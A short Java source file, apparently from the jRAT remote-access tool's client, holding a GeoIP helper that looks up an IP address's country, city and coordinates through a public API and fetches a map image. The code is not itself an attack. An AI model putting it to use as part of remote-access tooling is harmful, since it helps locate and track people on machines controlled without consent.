package se.jrat.client.net;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

import javax.imageio.ImageIO;

public class GeoIP {

	public static final String[] ARRAY_DATA = { "IP", "Country Code", "Country Name", "Region Code", "Region Name", "City", "Zipcode", "Latitude", "Longitude", "Metro Code", "Area Code" };

	public static String getValue(String val, String ip) {
		String[] info = getInfo(ip);

		for (int i = 0; i < info.length; i++) {
			if (ARRAY_DATA[i].equals(val)) {
				return info[i];
			}
		}

		return null;
	}

	public static String[] getInfo(String ip) {
		String url = "https://freegeoip.net/json/" + ip;
		String rawData = readLine(url);
		return process(rawData);
	}
	
	public static BufferedImage getMap(int zoom, double lat, double lon) throws Exception {
		return ImageIO.read(new URL("https://maps.googleapis.com/maps/api/staticmap?center=" + lat + "," + lon + "&zoom=" + zoom + "&size=600x300"));
	}

	private static String[] process(String s) {
		s = s.replace("{", "").replace("}", "");

		String[] indexes = s.split(",");
		String[] data = new String[indexes.length];

		for (int i = 0; i < indexes.length; i++) {
			data[i] = indexes[i].split(":")[1].replace("\"", "");
		}

		return data;
	}

	private static String readLine(String urlString) {
		try {
			BufferedReader in = new BufferedReader(new InputStreamReader(new URL(urlString).openStream()));
			return in.readLine();
		} catch (Throwable t) {
			return null;
		}

	}
}
